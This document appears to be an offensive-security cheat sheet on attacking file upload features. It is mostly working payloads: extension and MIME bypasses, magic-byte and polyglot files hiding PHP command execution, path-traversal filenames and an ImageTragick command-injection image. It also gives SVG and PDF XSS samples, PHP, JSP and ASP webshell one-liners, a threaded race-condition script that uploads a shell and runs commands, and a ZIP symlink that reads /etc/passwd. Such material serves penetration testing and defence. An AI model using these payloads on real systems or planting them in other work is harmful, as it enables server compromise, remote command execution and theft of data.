# File Upload Attacks

## Extension Bypass

| Blocked Extension | Bypass |
|---|---|
| `.php` | `.php5`, `.php7`, `.phtml`, `.phar`, `.phps`, `.pht` |
| `.asp` | `.aspx`, `.asa`, `.cer`, `.ashx` |
| `.jsp` | `.jspx`, `.jsw`, `.jsv`, `.jspf` |
| Case sensitivity | `.PHP`, `.Php`, `.pHp` |
| Double extension | `shell.php.jpg`, `shell.php.png` |
| Null byte (old) | `shell.php%00.jpg` (PHP < 5.3.4) |
| Trailing chars | `shell.php.`, `shell.php::$DATA` (Windows NTFS ADS) |
| Semicolon (IIS) | `shell.asp;.jpg` |
| Reverse double ext | `shell.jpg.php` (if server uses last ext) |

## MIME Type Bypass

```python
# Set Content-Type to match expected type while keeping malicious content
# Server checks: Content-Type header
# Browser executes based on actual content

headers = {'Content-Type': 'image/jpeg'}
files = {'file': ('innocent.jpg', php_code, 'image/jpeg')}
requests.post(url, files=files, headers=headers)
```

## Magic Bytes / File Signature

Prepend valid file headers to malicious content:

```python
# JPEG header + PHP code
payload = b'\xFF\xD8\xFF\xE0' + b'<?php system($_GET["cmd"]); ?>'

# PNG header + PHP code
payload = b'\x89PNG\r\n\x1a\n' + b'<?php system($_GET["cmd"]); ?>'

# GIF header + PHP code
payload = b'GIF89a' + b'<?php system($_GET["cmd"]); ?>'
```

## Polyglot Files

Files that are valid in multiple formats simultaneously.

### JPEG/PHP Polyglot

```bash
# Using exiftool to inject PHP into JPEG comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### PNG/HTML Polyglot

```python
# PNG header followed by HTML
payload = b'\x89PNG\r\n\x1a\n'
payload += b'<html><body><script>alert(1)</script></body></html>'
```

## Path Traversal in Filename

```
# Overwrite files outside upload directory
filename: ../../../var/www/html/shell.php
filename: ..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php
filename: ....//....//....//var/www/html/shell.php
```

## Content-Based Attacks

### ImageMagick (ImageTragick)

```
# CVE-2016-3714 — command injection via image processing
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|id")'
pop graphic-context
```

Save as `.mvg` or `.svg` and upload.

### SVG with JavaScript

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

If the uploaded SVG is served inline, this triggers XSS.

### PDF with JavaScript

```
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>
endobj
```

## Webshell Upload

### PHP Webshell

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?=`$_GET[0]`?>
```

### JSP Webshell

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### ASP Webshell

```asp
<%eval request("cmd")%>
```

## Race Condition Upload

**When**: Server validates the file after saving it temporarily.

1. Upload malicious file
2. Immediately request it before validation/deletion
3. Use threading to win the race

```python
import threading, requests

def upload():
    requests.post(upload_url, files={'file': ('shell.php', php_code)})

def access():
    for _ in range(100):
        r = requests.get(f'{target}/uploads/shell.php?cmd=id')
        if r.status_code == 200 and 'uid=' in r.text:
            print(r.text)

threads = [threading.Thread(target=upload) for _ in range(10)]
threads += [threading.Thread(target=access) for _ in range(10)]
for t in threads: t.start()
```

## ZIP Symlink Attack

```bash
# Create a symlink in a ZIP file
ln -s /etc/passwd link
zip --symlinks malicious.zip link
# Upload — if server extracts and serves, symlink resolves on server
```

## Bypassing Client-Side Validation

Client-side checks (JavaScript file type validation) are trivially
bypassed by intercepting the request with Burp or using curl directly.
Always test server-side validation independently.
